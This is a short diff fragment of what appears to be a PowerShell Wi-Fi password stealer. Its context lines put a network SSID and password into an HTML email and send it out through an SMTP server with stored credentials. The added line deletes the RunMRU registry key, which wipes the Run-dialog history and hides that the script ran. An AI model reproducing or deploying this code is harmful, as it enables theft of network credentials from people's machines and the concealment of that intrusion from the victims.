@@ -14,3 +14,4 @@ $Body += "<h3>SSID: 3333<br>PASSWORD: ::</h3>" -replace "::",$pm.PASS  -replace 
 }
 
 Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
